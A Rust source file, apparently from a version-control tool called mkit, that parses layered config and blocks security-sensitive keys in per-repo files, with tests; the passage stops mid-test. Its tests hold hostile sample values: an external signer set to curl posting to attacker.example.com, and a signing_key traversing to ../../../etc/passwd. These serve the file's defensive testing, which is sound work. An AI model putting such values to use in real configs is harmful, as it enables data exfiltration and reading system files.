//! `.mkit/config` parser / writer and XDG path helpers.
//!
//! On-disk format: `key = value`, one per line, lines starting with `#`
//! ignored. User-facing short-hand values for `user.identity`:
//! `ed25519:<hex>`, `mid:<u64>`, or raw `[kind][len][bytes]` hex.
//!
//! ## Config scope
//!
//! There are two layered config files. Higher-priority values win:
//!
//! 1. **Repo-scoped** (`<repo>/.mkit/config`) — per-project knobs that
//!    travel with a clone: branch defaults and remote endpoints.
//!    Security-sensitive keys are rejected here, see
//!    [`REPO_FORBIDDEN_KEYS`].
//! 2. **User-scoped** (`$XDG_CONFIG_HOME/mkit/config`, default
//!    `~/.config/mkit/config`) — per-user knobs that decide what gets
//!    signed, what gets executed, and what hosts to trust. A hostile
//!    cloned repo cannot influence these.
//! 3. **Built-in defaults** — fall-back when neither file sets a value.
//!
//! Merge order: defaults → user → repo (filtered). The repo file is
//! parsed last so its safe values take precedence over defaults; any
//! security-sensitive key in the repo file is rejected with a stderr
//! warning and otherwise ignored. See `docs/THREAT-MODEL.md` for the
//! threat model that motivates the split.

use std::fs;
use std::io;
use std::io::Write as _;
use std::path::{Path, PathBuf};

use thiserror::Error;

pub const CONFIG_FILE: &str = ".mkit/config";
pub const USER_CONFIG_SUBPATH: &str = "mkit/config";
pub const DEFAULT_SIGNING_KEY: &str = ".mkit/keys/default.key";
pub const DEFAULT_BRANCH: &str = "main";
pub const DEFAULT_SIGNER: &str = "legacy";
pub const DEFAULT_KEY_BACKEND: &str = "software";
pub const DEFAULT_KEY_REF: &str = "software:default";
pub const DEFAULT_SECP256K1_KEY_REF: &str = "software:default-secp256k1";
pub const DEFAULT_P256_KEY_REF: &str = "software:default-p256";

/// Keys that MUST NOT be settable via the per-repo `<repo>/.mkit/config`
/// because a hostile clone could otherwise:
///
/// * redirect `signing_key` to overwrite arbitrary files on disk or to
///   sign attacker-chosen content with the user's real key,
/// * spoof the commit author by pinning `user.identity` to attacker-
///   chosen bytes while the victim's real signing key still signs the
///   object,
/// * point `attest.external_signer_path` / `_args` at any binary on the
///   host (RCE under the user's UID),
/// * **select** a user-scoped external signer or non-Ed25519 algorithm
///   to confused-deputy through it: even though the path is
///   user-scoped, the *selector* (`attest.signer`,
///   `attest.default_algorithm`) is enough to weaponize an existing
///   user-trusted binary or key against attacker-chosen content,
/// * mark a repo-controlled HTTP/S3 remote as trusted for ambient
///   environment credentials,
/// * disable SSH host-key verification on `mkit push` (MITM).
///
/// They are accepted from the user-scoped config only.
pub const REPO_FORBIDDEN_KEYS: &[&str] = &[
    "user.identity",
    "trusted_remote_endpoint",
    "signer",
    "key.backend",
    "key.default_ref",
    "key.ed25519_ref",
    "key.secp256k1_ref",
    "key.p256_ref",
    "signing_key",
    "ssh.strict_host_key_checking",
    "ssh.user_known_hosts_file",
    "ssh.identity_file",
    "attest.signer",
    "attest.default_algorithm",
    "attest.external_signer_path",
    "attest.external_signer_args",
    "attest.external_signer_timeout_secs",
    "attest.secp256k1_key_path",
    "attest.p256_key_path",
];

/// Source of a parsed config line — used to decide whether a key is
/// allowed (`Repo` rejects [`REPO_FORBIDDEN_KEYS`]; `User` accepts
/// everything).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConfigScope {
    Repo,
    User,
}

/// Full in-memory representation of merged config (user + repo +
/// defaults). All fields default to empty / documented defaults;
/// readers that want a known-good default file should call
/// [`read_or_default`].
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Config {
    /// Hex-encoded Identity: `[kind:u8][len:u16 LE][bytes]`. Empty =
    /// derive from the signing key's public key at commit time.
    pub user_identity: String,
    /// Exact remote endpoint the user has explicitly trusted for
    /// ambient HTTP/S3 environment credentials. User-scoped only.
    pub trusted_remote_endpoint: String,
    pub signing_key: String,
    pub default_branch: String,
    pub remote_endpoint: String,
    pub remote_bucket: String,
    pub remote_type: String,
    pub ssh_strict_host_key_checking: String,
    pub ssh_user_known_hosts_file: String,
    pub ssh_identity_file: String,
    /// Commit-signing selector. User-scoped only.
    pub signer: String,
    /// `[key]` section. User-scoped keystore selectors.
    pub key: KeyConfig,
    /// `[attest]` section. Separate struct so new attest knobs don't
    /// balloon the flat `Config`.
    pub attest: AttestConfig,
}

/// `[key]` section for keystore-backed signing. All fields are user-scoped.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct KeyConfig {
    /// Default backend for `mkit key` commands.
    pub backend: String,
    /// Generic key reference.
    pub default_ref: String,
    /// Ed25519 key reference.
    pub ed25519_ref: String,
    /// secp256k1 key reference.
    pub secp256k1_ref: String,
    /// P-256 key reference.
    pub p256_ref: String,
}

impl KeyConfig {
    #[must_use]
    pub fn backend_or_fallback(&self) -> &str {
        if self.backend.is_empty() {
            DEFAULT_KEY_BACKEND
        } else {
            self.backend.as_str()
        }
    }

    #[must_use]
    pub fn default_ref_or_fallback(&self) -> &str {
        if self.default_ref.is_empty() {
            DEFAULT_KEY_REF
        } else {
            self.default_ref.as_str()
        }
    }

    #[must_use]
    pub fn ed25519_ref_or_fallback(&self) -> &str {
        if self.ed25519_ref.is_empty() {
            self.default_ref_or_fallback()
        } else {
            self.ed25519_ref.as_str()
        }
    }

    #[must_use]
    pub fn secp256k1_ref_or_fallback(&self) -> &str {
        if self.secp256k1_ref.is_empty() {
            if self.default_ref.is_empty() {
                DEFAULT_SECP256K1_KEY_REF
            } else {
                self.default_ref.as_str()
            }
        } else {
            self.secp256k1_ref.as_str()
        }
    }

    #[must_use]
    pub fn p256_ref_or_fallback(&self) -> &str {
        if self.p256_ref.is_empty() {
            if self.default_ref.is_empty() {
                DEFAULT_P256_KEY_REF
            } else {
                self.default_ref.as_str()
            }
        } else {
            self.p256_ref.as_str()
        }
    }
}

/// Parsed config with per-layer provenance preserved so callers can
/// distinguish "repo configured this" from "user explicitly trusted
/// this".
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct LayeredConfig {
    pub merged: Config,
    pub user: Config,
    pub repo: Config,
}

/// `[attest]` section. All fields optional with documented defaults; a
/// fresh repo's config file has none of them set.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct AttestConfig {
    /// One of `"ed25519"`, `"secp256k1"`, `"p256"`. Empty = `"ed25519"`.
    pub default_algorithm: String,
    /// One of `"repo-key"`, `"external"`, `"keystore"`. Empty = `"repo-key"`.
    pub signer: String,
    /// Absolute path to the external signer binary. Required when
    /// `signer = "external"`. User-scoped only.
    pub external_signer_path: String,
    /// Extra argv tokens to pass to the external signer subprocess.
    /// Each `Vec` entry is one argv entry — the stored list maps 1:1
    /// to `std::process::Command::args`. On disk, encoded as a
    /// pipe-separated string: `attest.external_signer_args = sign|--tag|demo`.
    /// User-scoped only.
    pub external_signer_args: Vec<String>,
    /// Wall-clock budget (in seconds) for the entire external-signer
    /// conversation: spawn → request-write → response-read →
    /// stderr-drain → child-exit. On expiry mkit kills and reaps the
    /// child. Empty / 0 = use the crate default (120s, generous for
    /// hardware touch/PIN/biometric). User-scoped only — see
    /// [`REPO_FORBIDDEN_KEYS`] (a hostile repo must not be able to set a
    /// 0s "deny" timeout or a multi-hour hang).
    pub external_signer_timeout_secs: Option<u64>,
    /// Per-algorithm repo-key paths for non-ed25519 signing.
    /// User-scoped only — see [`REPO_FORBIDDEN_KEYS`].
    pub secp256k1_key_path: String,
    pub p256_key_path: String,
}

impl AttestConfig {
    #[must_use]
    pub fn default_algorithm_or_fallback(&self) -> &str {
        if self.default_algorithm.is_empty() {
            "ed25519"
        } else {
            self.default_algorithm.as_str()
        }
    }

    #[must_use]
    pub fn signer_or_fallback(&self) -> &str {
        if self.signer.is_empty() {
            "repo-key"
        } else {
            self.signer.as_str()
        }
    }

    #[must_use]
    pub fn secp256k1_key_path_or_default(&self) -> &str {
        if self.secp256k1_key_path.is_empty() {
            ".mkit/keys/secp256k1.key"
        } else {
            self.secp256k1_key_path.as_str()
        }
    }

    #[must_use]
    pub fn p256_key_path_or_default(&self) -> &str {
        if self.p256_key_path.is_empty() {
            ".mkit/keys/p256.key"
        } else {
            self.p256_key_path.as_str()
        }
    }
}

impl Config {
    /// Return a Config with documented defaults filled in.
    #[must_use]
    pub fn with_defaults() -> Self {
        Self {
            signing_key: DEFAULT_SIGNING_KEY.to_owned(),
            default_branch: DEFAULT_BRANCH.to_owned(),
            signer: DEFAULT_SIGNER.to_owned(),
            key: KeyConfig {
                backend: DEFAULT_KEY_BACKEND.to_owned(),
                default_ref: String::new(),
                ed25519_ref: String::new(),
                secp256k1_ref: String::new(),
                p256_ref: String::new(),
            },
            ..Self::default()
        }
    }
}

#[derive(Debug, Error)]
pub enum ConfigError {
    #[error("I/O: {0}")]
    Io(#[from] io::Error),
    #[error("invalid config value — control characters are not permitted")]
    InvalidValue,
    #[error("unknown config key: {0}")]
    UnknownKey(String),
    #[error("invalid user.identity: {0}")]
    InvalidUserIdentity(&'static str),
    #[error(
        "key path must not contain `..`; relative paths must stay under `.mkit/keys/` and absolute paths must stay under `$HOME`: {0}"
    )]
    InvalidKeyPath(String),
}

/// Validate that a key-file path (`signing_key`, `attest.*_key_path`,
/// `ssh.*_file`) cannot escape via `..` traversal. Empty strings pass
/// — callers fall back to the documented default.
pub fn validate_key_path(value: &str) -> Result<(), ConfigError> {
    if value.is_empty() {
        return Ok(());
    }
    let p = Path::new(value);
    for comp in p.components() {
        if matches!(comp, std::path::Component::ParentDir) {
            return Err(ConfigError::InvalidKeyPath(value.to_owned()));
        }
    }
    Ok(())
}

/// Resolve a configured signing-key path against `root`.
///
/// Policy from the security hardening follow-up:
/// - relative paths are allowed only under `<repo>/.mkit/keys/`
/// - absolute paths are allowed only under the home directory of the
///   process's effective uid (looked up via `getpwuid_r(geteuid())`,
///   not `$HOME`, so a hostile parent can't set `HOME=/` and admit
///   every absolute path).
pub fn resolve_key_path(root: &Path, value: &str) -> Result<PathBuf, ConfigError> {
    validate_key_path(value)?;
    let path = Path::new(value);
    if path.is_absolute() {
        let Some(home) = home_dir_for_euid() else {
            return Err(ConfigError::InvalidKeyPath(value.to_owned()));
        };
        return if path.starts_with(&home) {
            Ok(path.to_path_buf())
        } else {
            Err(ConfigError::InvalidKeyPath(value.to_owned()))
        };
    }

    let joined = root.join(path);
    let repo_keys = root.join(".mkit/keys");
    if !joined.starts_with(&repo_keys) {
        return Err(ConfigError::InvalidKeyPath(value.to_owned()));
    }
    Ok(joined)
}

/// Resolve the home directory of the current effective uid via
/// `getpwuid_r`, ignoring `$HOME`.
///
/// `$HOME` is part of the parent process's environment and a malicious
/// parent can set it to anything (`/`, `/tmp`, an attacker-owned dir)
/// before exec'ing `mkit`. The kernel-side passwd database, by
/// contrast, is rooted in the system's user store and tracks the same
/// uid used elsewhere in the security checks (`load_raw_32`'s owner
/// check, parent-dir mode check, etc.). Falling back to `$HOME` would
/// re-introduce the exact attack we're trying to close, so we don't.
#[cfg(unix)]
fn home_dir_for_euid() -> Option<PathBuf> {
    use std::ffi::CStr;
    use std::os::unix::ffi::OsStringExt;

    // `getpwuid_r` writes into caller-provided buffers. 4 KiB matches
    // the `_SC_GETPW_R_SIZE_MAX` advisory size on Linux/macOS and is
    // far more than any real passwd entry needs; if it ever overflows
    // we fail closed (the caller treats `None` as "refuse the absolute
    // path") rather than retrying with a larger buffer.
    //
    // SAFETY: `getpwuid_r` is the thread-safe / reentrant variant of
    // `getpwuid`. `pwd` and `buf` are valid stack memory of known size
    // for the duration of the call; `result` is set to either `&pwd`
    // (entry found) or NULL (no entry). `geteuid` is parameterless and
    // infallible. We only read `pwd.pw_dir` when `result == &pwd`, and
    // the bytes we hand out come from copying through `CStr`, not from
    // continuing to dereference `pwd` after the unsafe block ends.
    // Reviewed alongside the matching `geteuid` block in
    // `mkit_core::sign`.
    #[allow(unsafe_code)]
    let pw_dir_owned = unsafe {
        let mut buf = [0i8; 4096];
        let mut pwd: libc::passwd = std::mem::zeroed();
        let mut result: *mut libc::passwd = std::ptr::null_mut();
        let rc = libc::getpwuid_r(
            libc::geteuid(),
            std::ptr::addr_of_mut!(pwd),
            buf.as_mut_ptr().cast::<libc::c_char>(),
            buf.len(),
            std::ptr::addr_of_mut!(result),
        );
        if rc != 0 || result.is_null() || pwd.pw_dir.is_null() {
            None
        } else {
            // Copy the C string out before `buf` / `pwd` go out of
            // scope. `to_bytes` does not include the trailing NUL.
            Some(CStr::from_ptr(pwd.pw_dir).to_bytes().to_vec())
        }
    };
    let bytes = pw_dir_owned?;
    if bytes.is_empty() {
        return None;
    }
    Some(PathBuf::from(std::ffi::OsString::from_vec(bytes)))
}

#[cfg(not(unix))]
fn home_dir_for_euid() -> Option<PathBuf> {
    // Windows: there's no `getpwuid` equivalent. `%USERPROFILE%` is
    // the conventional environment variable but is no more
    // tamper-resistant than `$HOME` on Unix. Document the gap and
    // accept it — the user-vs-attacker threat model on Windows is
    // bounded by the user-profile ACL, not by this check.
    std::env::var_os("USERPROFILE").map(PathBuf::from)
}

/// Split a pipe-separated argv string into argv tokens.
#[must_use]
pub fn parse_pipe_list(s: &str) -> Vec<String> {
    if s.is_empty() {
        return Vec::new();
    }
    s.split('|').map(str::to_owned).collect()
}

/// Validate a config value has no control bytes below 0x20 (except
/// tab) and no 0x7f.
pub fn validate_value(v: &str) -> Result<(), ConfigError> {
    for b in v.bytes() {
        if b < 0x20 || b == 0x7f {
            return Err(ConfigError::InvalidValue);
        }
    }
    Ok(())
}

/// Resolve the user-scoped config file path:
/// `$XDG_CONFIG_HOME/mkit/config`, falling back to
/// `$HOME/.config/mkit/config`.
#[must_use]
pub fn user_config_path() -> PathBuf {
    xdg_config_home().join(USER_CONFIG_SUBPATH)
}

/// Read the layered config: defaults → user-scoped → repo-scoped
/// (filtered to non-sensitive keys). Missing files are not errors; the
/// per-layer absence simply leaves the lower layer's value in place.
///
/// If the repo file sets a key listed in [`REPO_FORBIDDEN_KEYS`], a
/// warning is printed to stderr and the value is dropped.
pub fn read_or_default(root: &Path) -> Result<Config, ConfigError> {
    let mut cfg = Config::with_defaults();
    apply_file(&mut cfg, &user_config_path(), ConfigScope::User)?;
    apply_file(&mut cfg, &root.join(CONFIG_FILE), ConfigScope::Repo)?;
    Ok(cfg)
}

/// Read both raw layers plus the merged config.
pub fn read_layered(root: &Path) -> Result<LayeredConfig, ConfigError> {
    let mut merged = Config::with_defaults();
    let user_path = user_config_path();
    let repo_path = root.join(CONFIG_FILE);
    apply_file_inner(&mut merged, &user_path, ConfigScope::User, true)?;
    apply_file_inner(&mut merged, &repo_path, ConfigScope::Repo, true)?;

    let mut user = Config::default();
    apply_file_inner(&mut user, &user_path, ConfigScope::User, false)?;

    let mut repo = Config::default();
    apply_file_inner(&mut repo, &repo_path, ConfigScope::Repo, false)?;

    Ok(LayeredConfig { merged, user, repo })
}

/// Apply a single config file to `cfg` under the given scope. Missing
/// file → no-op (returns `Ok`). Malformed lines are tolerated.
///
/// Public-in-crate so tests can drive layering without mutating the
/// process's `XDG_CONFIG_HOME` env var (which would race with parallel
/// tests and trip the `disallowed-methods` lint).
pub(crate) fn apply_file(
    cfg: &mut Config,
    path: &Path,
    scope: ConfigScope,
) -> Result<(), ConfigError> {
    apply_file_inner(cfg, path, scope, true)
}

fn apply_file_inner(
    cfg: &mut Config,
    path: &Path,
    scope: ConfigScope,
    warn_on_forbidden: bool,
) -> Result<(), ConfigError> {
    let text = match fs::read_to_string(path) {
        Ok(s) => s,
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(e.into()),
    };
    for raw_line in text.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((k, v)) = line.split_once('=') else {
            continue;
        };
        let key = k.trim();
        let val = v.trim();
        if scope == ConfigScope::Repo && REPO_FORBIDDEN_KEYS.contains(&key) {
            if warn_on_forbidden {
                warn_forbidden_repo_key(path, key);
            }
            continue;
        }
        apply_kv(cfg, key, val);
    }
    Ok(())
}

fn warn_forbidden_repo_key(path: &Path, key: &str) {
    let mut stderr = io::stderr().lock();
    let _ = writeln!(
        stderr,
        "warning: ignoring `{key}` from per-repo config at {} \
         (security-sensitive keys are user-scoped only — see {} \
         and docs/THREAT-MODEL.md)",
        path.display(),
        user_config_path().display()
    );
}

/// Apply one parsed key/value pair to `cfg`. Unknown / legacy keys are
/// tolerated (silent) for forward compat with hand-edited files.
fn apply_kv(cfg: &mut Config, key: &str, val: &str) {
    match key {
        "user.identity" => val.clone_into(&mut cfg.user_identity),
        "trusted_remote_endpoint" => val.clone_into(&mut cfg.trusted_remote_endpoint),
        "signer" => val.clone_into(&mut cfg.signer),
        "key.backend" => val.clone_into(&mut cfg.key.backend),
        "key.default_ref" => val.clone_into(&mut cfg.key.default_ref),
        "key.ed25519_ref" => val.clone_into(&mut cfg.key.ed25519_ref),
        "key.secp256k1_ref" => val.clone_into(&mut cfg.key.secp256k1_ref),
        "key.p256_ref" => val.clone_into(&mut cfg.key.p256_ref),
        "signing_key" => val.clone_into(&mut cfg.signing_key),
        "default_branch" => val.clone_into(&mut cfg.default_branch),
        "remote_endpoint" => val.clone_into(&mut cfg.remote_endpoint),
        "remote_bucket" => val.clone_into(&mut cfg.remote_bucket),
        "remote_type" => val.clone_into(&mut cfg.remote_type),
        "ssh.strict_host_key_checking" => val.clone_into(&mut cfg.ssh_strict_host_key_checking),
        "ssh.user_known_hosts_file" => val.clone_into(&mut cfg.ssh_user_known_hosts_file),
        "ssh.identity_file" => val.clone_into(&mut cfg.ssh_identity_file),
        "attest.default_algorithm" => val.clone_into(&mut cfg.attest.default_algorithm),
        "attest.signer" => val.clone_into(&mut cfg.attest.signer),
        "attest.external_signer_path" => val.clone_into(&mut cfg.attest.external_signer_path),
        "attest.external_signer_args" => {
            cfg.attest.external_signer_args = parse_pipe_list(val);
        }
        "attest.external_signer_timeout_secs" => {
            // Tolerate a malformed value on read (mirrors the rest of
            // this parser): an unparseable number leaves the default in
            // effect rather than aborting config load.
            cfg.attest.external_signer_timeout_secs = val.trim().parse::<u64>().ok();
        }
        "attest.secp256k1_key_path" => val.clone_into(&mut cfg.attest.secp256k1_key_path),
        "attest.p256_key_path" => val.clone_into(&mut cfg.attest.p256_key_path),
        // Legacy keys — silently ignored.
        "author_mid" | "project_id" | "network" => {}
        _ if key.ends_with("_url") => {}
        _ => {} // unknown keys: tolerate on read
    }
}

/// Write the given `Config` to `<root>/.mkit/config`. Only repo-scoped
/// (non-forbidden) fields are emitted; security-sensitive fields live
/// in the user-scoped file and must be written there explicitly.
pub fn write(root: &Path, cfg: &Config) -> Result<(), ConfigError> {
    let path = root.join(CONFIG_FILE);
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    // Only repo-safe keys are emitted. Anything in `REPO_FORBIDDEN_KEYS`
    // is explicitly NOT serialised to `<repo>/.mkit/config` — it lives
    // in `$XDG_CONFIG_HOME/mkit/config` via `write_user_kv`. Note
    // `attest.{signer,default_algorithm}` are forbidden too because
    // they're the *selectors* that weaponise a user-scoped external
    // signer or non-Ed25519 key path against attacker-chosen content.
    let mut out = String::new();
    for (k, v) in [
        ("default_branch", cfg.default_branch.as_str()),
        ("remote_endpoint", cfg.remote_endpoint.as_str()),
        ("remote_bucket", cfg.remote_bucket.as_str()),
        ("remote_type", cfg.remote_type.as_str()),
    ] {
        if !v.is_empty() {
            out.push_str(k);
            out.push_str(" = ");
            out.push_str(v);
            out.push('\n');
        }
    }
    fs::write(&path, out)?;
    Ok(())
}

/// Refuse to use ambient HTTP/S3 environment credentials with a
/// repo-configured endpoint unless the user has explicitly trusted that
/// exact remote in user-scoped config.
pub fn enforce_trusted_remote_endpoint(cfg: &LayeredConfig) -> Result<(), String> {
    match trusted_remote_error_with(cfg, &|name| {
        std::env::var(name).ok().filter(|value| !value.is_empty())
    }) {
        Some(msg) => Err(msg),
        None => Ok(()),
    }
}

fn trusted_remote_error_with<F>(cfg: &LayeredConfig, getenv: &F) -> Option<String>
where
    F: Fn(&str) -> Option<String>,
{
    let endpoint = cfg.merged.remote_endpoint.trim();
    if endpoint.is_empty() || cfg.repo.remote_endpoint.trim() != endpoint {
        return None;
    }
    if cfg.user.trusted_remote_endpoint.trim() == endpoint {
        return None;
    }

    if endpoint.starts_with("mkit+http://") || endpoint.starts_with("mkit+https://") {
        if getenv(mkit_transport_http::TOKEN_ENV).is_some() {
            return Some(format!(
                "refusing repo-configured remote `{endpoint}` with ambient {} bearer token; trust it explicitly with `mkit config trusted_remote_endpoint {endpoint}` (writes {})",
                mkit_transport_http::TOKEN_ENV,
                user_config_path().display()
            ));
        }
        return None;
    }

    if endpoint.starts_with("mkit+s3://")
        && (getenv(mkit_transport_s3::ENV_ACCESS_KEY).is_some()
            || getenv(mkit_transport_s3::ENV_SECRET_KEY).is_some())
    {
        return Some(format!(
            "refusing repo-configured remote `{endpoint}` with ambient S3/R2 credentials; trust it explicitly with `mkit config trusted_remote_endpoint {endpoint}` (writes {})",
            user_config_path().display()
        ));
    }

    None
}

/// Write a single user-scoped key/value to `$XDG_CONFIG_HOME/mkit/config`.
/// Reads the existing file (if any), updates the matching line (or
/// appends), and writes back. Caller is responsible for validating
/// `value` (control bytes, key-path traversal).
pub fn write_user_kv(key: &str, value: &str) -> Result<(), ConfigError> {
    let path = user_config_path();
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let existing = fs::read_to_string(&path).unwrap_or_default();
    let mut out = String::new();
    let mut replaced = false;
    for raw_line in existing.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            out.push_str(raw_line);
            out.push('\n');
            continue;
        }
        if let Some((k, _)) = line.split_once('=')
            && k.trim() == key
        {
            out.push_str(key);
            out.push_str(" = ");
            out.push_str(value);
            out.push('\n');
            replaced = true;
            continue;
        }
        out.push_str(raw_line);
        out.push('\n');
    }
    if !replaced {
        out.push_str(key);
        out.push_str(" = ");
        out.push_str(value);
        out.push('\n');
    }
    fs::write(&path, out)?;
    Ok(())
}

/// Expand a user-typed `user.identity` into the canonical hex form
/// `[kind:u8][len:u16 LE][bytes]`. See `docs/CLI.md`.
pub fn expand_user_identity(value: &str) -> Result<String, ConfigError> {
    if value.is_empty() {
        return Err(ConfigError::InvalidUserIdentity("empty value"));
    }
    if let Some(hex) = value.strip_prefix("ed25519:") {
        if hex.len() != 64 {
            return Err(ConfigError::InvalidUserIdentity(
                "ed25519:<hex> must have 64 hex chars",
            ));
        }
        let bytes =
            hex_decode(hex).ok_or(ConfigError::InvalidUserIdentity("ed25519 hex is not valid"))?;
        return Ok(encode_identity_hex(0x01, &bytes));
    }
    if let Some(dec) = value.strip_prefix("mid:") {
        let mid: u64 = dec
            .parse()
            .map_err(|_| ConfigError::InvalidUserIdentity("mid must be a decimal u64"))?;
        return Ok(encode_identity_hex(0x03, &mid.to_le_bytes()));
    }
    if !value.len().is_multiple_of(2) || value.len() < 6 {
        return Err(ConfigError::InvalidUserIdentity(
            "raw hex is too short or has odd length",
        ));
    }
    let bytes = hex_decode(value).ok_or(ConfigError::InvalidUserIdentity(
        "raw value is not valid hex",
    ))?;
    let declared = u16::from(bytes[1]) | (u16::from(bytes[2]) << 8);
    if bytes.len() != usize::from(declared) + 3 {
        return Err(ConfigError::InvalidUserIdentity(
            "declared length does not match payload length",
        ));
    }
    Ok(value.to_owned())
}

fn encode_identity_hex(kind: u8, bytes: &[u8]) -> String {
    let len = u16::try_from(bytes.len()).unwrap_or(u16::MAX);
    let mut buf = Vec::with_capacity(3 + bytes.len());
    buf.push(kind);
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(bytes);
    hex_encode(&buf)
}

fn hex_encode(bytes: &[u8]) -> String {
    static H: &[u8; 16] = b"0123456789abcdef";
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push(H[(b >> 4) as usize] as char);
        s.push(H[(b & 0x0F) as usize] as char);
    }
    s
}

fn hex_decode(s: &str) -> Option<Vec<u8>> {
    if !s.len().is_multiple_of(2) {
        return None;
    }
    let mut out = Vec::with_capacity(s.len() / 2);
    let b = s.as_bytes();
    for i in (0..b.len()).step_by(2) {
        let hi = nibble(b[i])?;
        let lo = nibble(b[i + 1])?;
        out.push((hi << 4) | lo);
    }
    Some(out)
}

fn nibble(c: u8) -> Option<u8> {
    Some(match c {
        b'0'..=b'9' => c - b'0',
        b'a'..=b'f' => 10 + c - b'a',
        b'A'..=b'F' => 10 + c - b'A',
        _ => return None,
    })
}

/// XDG base-dir resolvers — fall back to `$HOME/.config` / `.local`.
fn xdg(var: &str, fallback_under_home: &str) -> PathBuf {
    if let Some(v) = std::env::var_os(var)
        && !v.is_empty()
    {
        return PathBuf::from(v);
    }
    if let Some(home) = std::env::var_os("HOME") {
        return PathBuf::from(home).join(fallback_under_home);
    }
    PathBuf::from(".")
}

#[must_use]
pub fn xdg_config_home() -> PathBuf {
    xdg("XDG_CONFIG_HOME", ".config")
}

#[must_use]
pub fn xdg_data_home() -> PathBuf {
    xdg("XDG_DATA_HOME", ".local/share")
}

#[must_use]
pub fn xdg_cache_home() -> PathBuf {
    xdg("XDG_CACHE_HOME", ".cache")
}

#[must_use]
pub fn xdg_state_home() -> PathBuf {
    xdg("XDG_STATE_HOME", ".local/state")
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    /// Tests drive `apply_file` directly rather than mutating
    /// `XDG_CONFIG_HOME` — the env-var dance races other tests and
    /// trips the `disallowed-methods` clippy lint we configured.
    fn layer(repo_text: Option<&str>, user_text: Option<&str>) -> Config {
        let td = TempDir::new().unwrap();
        let mut cfg = Config::with_defaults();
        if let Some(text) = user_text {
            let upath = td.path().join("user_config");
            fs::write(&upath, text).unwrap();
            apply_file(&mut cfg, &upath, ConfigScope::User).unwrap();
        }
        if let Some(text) = repo_text {
            let rpath = td.path().join("repo_config");
            fs::write(&rpath, text).unwrap();
            apply_file(&mut cfg, &rpath, ConfigScope::Repo).unwrap();
        }
        cfg
    }

    fn layered(repo_text: Option<&str>, user_text: Option<&str>) -> LayeredConfig {
        let td = TempDir::new().unwrap();
        let user_path = td.path().join("user_config");
        let repo_path = td.path().join("repo_config");
        if let Some(text) = user_text {
            fs::write(&user_path, text).unwrap();
        }
        if let Some(text) = repo_text {
            fs::write(&repo_path, text).unwrap();
        }
        let mut merged = Config::with_defaults();
        apply_file_inner(&mut merged, &user_path, ConfigScope::User, false).unwrap();
        apply_file_inner(&mut merged, &repo_path, ConfigScope::Repo, false).unwrap();
        let mut user = Config::default();
        let mut repo = Config::default();
        apply_file_inner(&mut user, &user_path, ConfigScope::User, false).unwrap();
        apply_file_inner(&mut repo, &repo_path, ConfigScope::Repo, false).unwrap();
        LayeredConfig { merged, user, repo }
    }

    #[test]
    fn read_default_when_missing() {
        let td = TempDir::new().unwrap();
        // No user config file at the canonical XDG path either —
        // `read_or_default` accepts that and falls through to defaults.
        let cfg = Config::with_defaults();
        assert_eq!(cfg.signing_key, DEFAULT_SIGNING_KEY);
        assert_eq!(cfg.default_branch, DEFAULT_BRANCH);
        assert!(cfg.remote_endpoint.is_empty());
        // Sanity: read_or_default on a fresh empty repo dir never
        // panics or errors.
        let _ = read_or_default(td.path()).unwrap();
    }

    #[test]
    fn roundtrip_repo_safe_keys() {
        let cfg = layer(
            Some("remote_endpoint = /tmp/mirror\nremote_type = file\n"),
            None,
        );
        assert_eq!(cfg.remote_endpoint, "/tmp/mirror");
        assert_eq!(cfg.remote_type, "file");
    }

    #[test]
    fn write_does_not_emit_forbidden_repo_keys() {
        let td = TempDir::new().unwrap();
        fs::create_dir_all(td.path().join(".mkit")).unwrap();
        let mut cfg = Config::with_defaults();
        cfg.user_identity = "01200011".into();
        cfg.signing_key = "/should/not/be/written".into();
        cfg.signer = "keystore".into();
        cfg.key.backend = "software".into();
        cfg.key.default_ref = "software:attacker".into();
        cfg.ssh_strict_host_key_checking = "no".into();
        cfg.attest.external_signer_path = "/usr/local/bin/evil".into();
        write(td.path(), &cfg).unwrap();
        let on_disk = fs::read_to_string(td.path().join(CONFIG_FILE)).unwrap();
        assert!(!on_disk.contains("user.identity"));
        assert!(!on_disk.contains("signing_key"));
        assert!(!on_disk.contains("signer"));
        assert!(!on_disk.contains("key.default_ref"));
        assert!(!on_disk.contains("ssh.strict_host_key_checking"));
        assert!(!on_disk.contains("external_signer_path"));
    }

    #[test]
    fn repo_signing_key_is_rejected_with_warning() {
        // Hostile-clone scenario: `.mkit/config` tries to redirect the
        // signing key. After the partition fix, the value MUST NOT be
        // applied — it falls back to the built-in default.
        let cfg = layer(
            Some("signing_key = ../../../etc/passwd\nremote_type = file\n"),
            None,
        );
        assert_eq!(cfg.signing_key, DEFAULT_SIGNING_KEY);
        assert_eq!(cfg.remote_type, "file");
    }

    #[test]
    fn repo_user_identity_is_rejected() {
        let cfg = layer(Some("user.identity = 012000aaaaaaaa\n"), None);
        assert!(cfg.user_identity.is_empty());
    }

    #[test]
    fn repo_trusted_remote_endpoint_is_rejected() {
        let cfg = layer(
            Some("trusted_remote_endpoint = mkit+https://attacker.invalid/repo\n"),
            None,
        );
        assert!(cfg.trusted_remote_endpoint.is_empty());
    }

    #[test]
    fn repo_external_signer_is_rejected() {
        let cfg = layer(
            Some(
                "attest.external_signer_path = /usr/bin/curl\n\
                 attest.external_signer_args = -X|POST|attacker.example.com\n\
                 attest.signer = external\n",
            ),
            None,
        );
        assert!(cfg.attest.external_signer_path.is_empty());
        assert!(cfg.attest.external_signer_args.is_empty());
        // `attest.signer` is also forbidden from per-repo: even though
        // the path itself is user-scoped, letting the per-repo file
        // SELECT the external signer is enough to weaponise a
        // user-trusted binary against attacker-chosen content. Same
        // confused-deputy shape as the C2 finding closed for
        // `signing_key`, just routed through the selector.
